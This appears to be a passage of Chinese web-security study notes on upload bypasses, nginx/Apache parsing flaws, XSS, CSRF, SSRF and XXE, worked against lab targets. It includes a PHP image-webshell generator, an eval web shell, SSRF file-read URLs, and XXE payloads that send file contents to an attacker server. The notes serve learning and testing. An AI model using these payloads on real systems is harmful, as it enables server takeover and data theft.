<p>2. 绕过：<br>1、配合文件包含漏洞：<br>  将一句话木马插入到网站二次处理后的图片中，也就是把一句话插入图片在二次渲染后会保留的那部分数据里，确保不会在二次处理时删除掉。这样二次渲染后的图片中就存在了一句话，在配合文件包含漏洞获取webshell。</p>
<p>​         2、可以配合条件竞争：<br>  这里二次渲染的逻辑存在漏洞，先将文件上传，之后再判断，符合就保存，不符合删除，可利用条件竞争来进行爆破上传<br>  点我进入条件竞争漏洞</p>
<ol start="3">
<li><p>如何判断图片是否进行了二次处理？<br>对比要上传图片与上传后的图片大小，编辑器打开图片查看上传后保留了拿些数据</p>
</li>
<li><p>二次渲染脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在同目录下运行   将生成的图片马上传；</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php idat.php <span class="number">1</span>.png</span><br></pre></td></tr></table></figure></li>
</ol>
<p>###六，中间件解析漏洞和编辑器漏洞</p>
<p>####nginx文件解析漏洞  </p>
<p>版本信息：</p>
<ul>
<li>Nginx 1.x 最新版</li>
<li>PHP 7.x最新版</li>
</ul>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240415000937289.png" alt="image-20240415000937289"></p>
<p>**抓包上传一个jpg（带木马代码）修改文件头部为GIF89a **</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240415001351653.png" alt="image-20240415001351653"></p>
<p>访问地址<a target="_blank" rel="noopener" href="http://192.168.42.229/uploadfiles/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/.php">192.168.42.229&#x2F;uploadfiles&#x2F;f3ccdd27d2000e3f9255a7e3e2c48800.jpg&#x2F;.php</a></p>
<p>成功以php解析</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240415001516872.png" alt="image-20240415001516872"></p>
<p>最后打开蚁剑连接，拿到shell</p>
<p>####nginx文件名逻辑漏洞（CVE-2013-4547）</p>
<p>影响版本：Nginx 0.8.41 ~ 1.4.3 &#x2F; 1.5.0 ~ 1.5.7</p>
<h4 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h4><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure>

<p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p>
<p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure>

<p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
<p><strong>复现</strong></p>
<p>打开是一个文件上传的窗口，随便上传一个图片文件进行抓包</p>
<p>将文件名改为：1.php.jpg   文件内容为：一句话代码 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>访问文件成功解析为php</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240415092816857.png" alt="image-20240415092816857"></p>
<p>####Apache 换行解析漏洞</p>
<p>待填充</p>
<p>CMS: filecms   cuppacms(待实践)</p>
<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p><strong>一、XSS简介</strong><br><strong>XSS全称：跨站脚本(Cross Site Scripting) ,为了不和层叠样式表(Cascading Style Sheets)的缩写CSS混合，所以改名为XSS；攻击者会向web页面(input表单、URL、留言版等位置)插入恶意JavaScript代码，导致管理员&#x2F;用户访问时触发，从而达到攻击者的目的。</strong></p>
<p><strong>二、XSS原理</strong><br><strong>服务器对用户提交的数据过滤不严，导致浏览器把用户的输入当成了JS代码并直接返回给客户端执行，从而实现对客户端的攻击目的。</strong></p>
<p><strong>kali安装beef-xss</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt remove ruby   # 清除ruby  beef-xss 并清除beef-xss配置文件</span><br><span class="line">apt remove beef-xss</span><br><span class="line">apt-get install ruby</span><br><span class="line">apt autoremove beef-xss</span><br><span class="line">apt-get install ruby      # 再安装 ruby ......</span><br><span class="line">apt-get install ruby-dev libpcap-dev</span><br><span class="line">gem install eventmachine</span><br><span class="line">apt-get install beef-xss</span><br></pre></td></tr></table></figure>



<h4 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h4><h4 id="存储型-finecms"><a href="#存储型-finecms" class="headerlink" title="存储型(finecms)"></a>存储型(finecms)</h4><p>####1、finecms安装</p>
<p>将cms解压到自己的根目录下</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240418140225304.png" alt="image-20240418140225304"></p>
<p>在小皮中创建网站并且同步数据库（注意php版本要在5-7之间的版本）</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240418140323030.png" alt="image-20240418140323030"></p>
<p>访问test.finecms.com&#x2F;install.php完成安装导向</p>
<p>成功进入后台：默认账号密码admin&#x2F;admin</p>
<p>####2、判断插入点：</p>
<p>查看错误日志，根据目录查看源代码，试着写入语句：看错误日志是否成功写入</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240418141302452.png" alt="image-20240418141302452"></p>
<p>成功写入js代码</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240418141328760.png" alt="image-20240418141328760"></p>
<p>代码审计跟踪到log.php 发现有write_log方法创建日志文件并写入错误信息，没有对错误信息过滤。</p>
<p>所以我们在首页可以任意插入js代码，从而获取管理员的cookie等操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://test.finecms.com/index.php?s=member&amp;c=account&amp;m=1&lt;script&gt;alert(helloworld)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h4 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h4><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>###一、什么是CSRF?</p>
<p>CSRF (Cross-site request forgery，跨站请求伪造)也被称为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本(XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。</p>
<h2 id="二、CSRF攻击原理及过程"><a href="#二、CSRF攻击原理及过程" class="headerlink" title="二、CSRF攻击原理及过程"></a>二、CSRF攻击原理及过程</h2><p>CSRF为什么能够攻击成功?</p>
<p>其本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</p>
<p>攻击者只有预测出URL的所有参数与参数值，才能成功地构造一个伪造的请求;反之，攻击者将无法攻击成功。</p>
<p>CSRF攻击的条件：</p>
<p>1、登录受信任站点A，并在本地生成Cookie。</p>
<p>2、在不登出A的情况下，访问危急站点B。</p>
<p>####CSRF攻击的复现：</p>
<p>#SSRF</p>
<p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web<br>应用作为代理攻击远程和本地的服务器。<br>主要攻击方式如下所示。</p>
<ul>
<li>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</li>
<li>攻击运行在内网或本地的应用程序。</li>
<li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li>
<li>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</li>
<li>利用file协议读取本地文件等。</li>
</ul>
<p><img src="https://img2023.cnblogs.com/blog/2504969/202309/2504969-20230913102057953-1816848668.png" alt="1646264163213-66a6b56a-7e56-4f5c-962f-7e1e864bb22a.png"></p>
<p>伪协议学习</p>
<p>1、file:&#x2F;&#x2F;</p>
<p>从文件系统中获取文件内容,格式为file:&#x2F;&#x2F;[文件路径]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd            读取文件passwd</span><br><span class="line">file:///etc/hosts                显示当前操作系统网卡的IP</span><br><span class="line">file:///proc/net/arp           显示arp缓存表(寻找内网其他主机)</span><br><span class="line">file:///proc/net/fib _trie     显示当前网段路由信息</span><br><span class="line">file:///D:/www.txt</span><br><span class="line">dict://127.0.0.1:3306/info</span><br><span class="line">ftp://192.168.46.148:21</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">SSRF黑盒可能出现的地方：</span><br><span class="line">1.社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line">2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">3.在线翻译：给网址翻译对应网页的内容</span><br><span class="line">4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line">5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line">6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line">7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line">8.数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line">9.邮件系统：比如接收邮件服务器地址</span><br><span class="line">10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line">11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</span><br><span class="line">一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br><span class="line">-SSRF白盒可能出现的地方：</span><br><span class="line">1、功能点抓包指向代码块审计</span><br><span class="line">2、功能点函数定位代码块审计</span><br><span class="line">-SSRF常见安全修复防御方案：</span><br><span class="line">1、禁用跳转</span><br><span class="line">2、禁用不需要的协议</span><br><span class="line">3、固定或限制资源地址</span><br><span class="line">4、错误信息统一信息处理</span><br></pre></td></tr></table></figure>



<h1 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h1><p><code>XML</code>即 可扩展标记语言（EXtensible Markup Language），是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是：</p>
<ul>
<li>HTML 被设计用来显示数据</li>
<li>XML 被设计用来传输和存储数据</li>
</ul>
<p>####XML外部实体注入(XML External Entity)</p>
<h2 id="1、任意文件读取"><a href="#1、任意文件读取" class="headerlink" title="1、任意文件读取"></a>1、任意文件读取</h2><p>最简单也是最常用的利用方式<br>一般xxe利用分为两大场景：有回显和无回显。有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为Blind XXE，可以使用外带数据通道提取数据。</p>
<h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><h4 id="恶意引入外部实体"><a href="#恶意引入外部实体" class="headerlink" title="恶意引入外部实体"></a>恶意引入外部实体</h4><p>直接读靶场 (XXE-lab for php) 文件</p>
<p>1、抓包分析是否是xml，以下是抓取的数据包：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/xxe/php_xxe/doLogin.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/xml, text/xml, */*; q=0.01   //此处也可以判断为xml</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/xml;charset=utf-8</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest   //此处可以判断为xml</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>66</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/xxe/php_xxe/</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>127.0.0.1</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123456<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>将上列代码改成如下所示：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">rabbit</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///d:/1.txt&quot;</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;rabbit;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果1.txt存在则有回显</p>
<p><img src="https://wch3820.oss-cn-hongkong.aliyuncs.com/img/image-20240421201127519.png" alt="image-20240421201127519"></p>
<h4 id="恶意引入外部参数实体"><a href="#恶意引入外部参数实体" class="headerlink" title="恶意引入外部参数实体"></a>恶意引入外部参数实体</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://vps-ip/hack.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %file;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">test</span>&gt;</span><span class="symbol">&amp;hhh;</span><span class="tag">&lt;/<span class="name">test</span>&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">hhh</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///d:/1.txt&#x27;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><h4 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h4><p>先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器(攻击服务器)xxx.xxx.xxx。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=./target.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xxx.xxx.xxx/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>evil.dtd的内容，内部的%号要进行实体编码成&amp;#x25。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://xxx.xxx.xxx/?data=%file;&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="meta">&gt;</span></span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>以下内容皆出自JrXnm师傅博客<br><a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/blind-xxe-%E8%AF%A6%E8%A7%A3-google-ctf-%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/">Blind XXE 详解 + Google CTF 一道题目分析</a></p>
<blockquote>
<p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。<br>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p>
</blockquote>
<h5 id="通过引入服务器文件"><a href="#通过引入服务器文件" class="headerlink" title="通过引入服务器文件"></a>通过引入服务器文件</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://blog.szfszf.top/xml.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">	%remote;</span></span><br><span class="line"><span class="meta">	%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>xml.dtd</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- xml.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%start;</span><br></pre></td></tr></table></figure>

<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p><strong>漏洞利用条件</strong><br>存在读文件的函数：<br>fopen() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">$fp = fopen($file, &#x27;r&#x27;); // 打开文件</span><br><span class="line">$data = fread($fp, filesize($file)); // 读取文件内容</span><br><span class="line">fclose($fp); // 关闭文件</span><br><span class="line">echo $data; // 输出文件内容</span><br></pre></td></tr></table></figure>

<p>fread() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">$fp = fopen($file, &#x27;r&#x27;); // 打开文件</span><br><span class="line">$data = fread($fp, 1024); // 读取文件前 1024 字节的内容</span><br><span class="line">fclose($fp); // 关闭文件</span><br><span class="line">echo $data; // 输出文件内容</span><br></pre></td></tr></table></figure>

<p>include() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">include($file); // 包含文件并输出内容</span><br></pre></td></tr></table></figure>

<p>readfile() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">readfile($file); // 读取并输出文件内容</span><br></pre></td></tr></table></figure>

<p>file_get_contents() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">$data = file_get_contents($file); // 读取文件内容</span><br><span class="line">echo $data; // 输出文件内容</span><br></pre></td></tr></table></figure>

<p>file() 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$file = $_GET[&#x27;file&#x27;]; // 用户提供的文件路径</span><br><span class="line">$data = file($file); // 将文件读入数组中</span><br><span class="line">echo implode(&#x27;&#x27;, $data); // 输出文件内容</span><br></pre></td></tr></table></figure>

